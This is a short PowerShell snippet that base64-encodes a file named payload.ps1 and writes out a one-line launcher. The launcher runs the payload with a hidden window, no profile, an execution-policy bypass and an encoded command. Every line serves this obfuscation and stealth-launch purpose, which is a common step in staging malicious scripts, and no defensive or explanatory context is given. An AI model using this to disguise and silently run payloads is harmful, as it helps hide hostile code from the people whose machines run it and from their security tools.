$s = Get-Content .\payload.ps1 -Raw
$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($s))
"powershell -nop -w hidden -ep bypass -e $b64" | Out-File .\base64_payload.txt -Encoding ASCII -NoNewline